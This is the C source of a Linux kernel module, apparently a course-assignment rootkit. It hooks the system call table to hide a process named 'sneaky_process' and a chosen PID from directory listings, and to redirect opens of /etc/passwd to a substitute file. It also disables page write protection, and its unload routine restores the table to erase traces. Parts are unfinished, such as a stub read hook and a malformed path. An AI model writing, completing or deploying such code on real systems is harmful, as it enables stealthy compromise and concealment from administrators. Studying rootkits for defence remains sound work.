#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>    // Contains function e.g. kallsyms_lookup_name
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <asm/paravirt.h>

#include <linux/unistd.h>        // for system call constants
#include <linux/version.h>
#include <linux/dirent.h>      // Contains dirent structs etc


#define PREFIX "sneaky_process"

// #define handle_error(msg) \
//                do { perror(msg); exit(EXIT_FAILURE); } while (0)


// Command line argument for modules
MODULE_LICENSE("GPL");
static char * sneaky_pid = "";
module_param(sneaky_pid, charp, 0);

//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *regs);
asmlinkage int (*original_getdents64)(struct pt_regs *regs);
asmlinkage int (*original_read)(struct pt_regs *regs);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  //return (*original_openat)(regs);
  const char * filename = regs->si;
  const char * target = "/etc/passwd";
  const char * fake = "tmp/passwd";
  if(strcmp(filename, target) == 0){
    copy_to_user(filename, fake, strlen(fake));
  }
  return original_openat(regs);

}

asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs){
  // Implement the sneaky part here
  int nread;
  unsigned long dirp = regs->si;
  nread = original_getdents64(regs);

  if(nread == -1){
    printk(KERN_INFO "Error for gendents64!!!\n");
  }
  else if (nread == 0){
    return 0;
  }
  else{
    long bpos = 0;
    struct linux_dirent64 *d;
    for(; bpos < nread;){
      d = (struct linux_dirent64 *) ((char*)dirp + bpos);
      if ((strcmp(d->d_name, PREFIX) == 0) || (strcmp(d->d_name, sneaky_pid) == 0)) {
        memmove((char*) dirp + bpos, (char*) dirp + bpos + d->d_reclen, nread - (bpos + d->d_reclen));
        nread -= d->d_reclen; 
      }
      else{
        bpos += d->d_reclen;
      }
    }
  }

  return nread;
}

asmlinkage int sneaky_sys_read(struct pt_regs *regs)
{
  // Implement the sneaky part here
  //return (*original_read)(regs);
  return 0;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");
  int err = 1;
  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  #if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
  #else
    sys_call_table = NULL;
  #endif

  if(sys_call_table == 0){
    printk(KERN_INFO "error: sys_call_table == null");
    return err;
  }
    

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  //original_read = (void *)sys_call_table[__NR_read];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  // You need to replace other system calls you need to hack here
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  //sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  //sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");


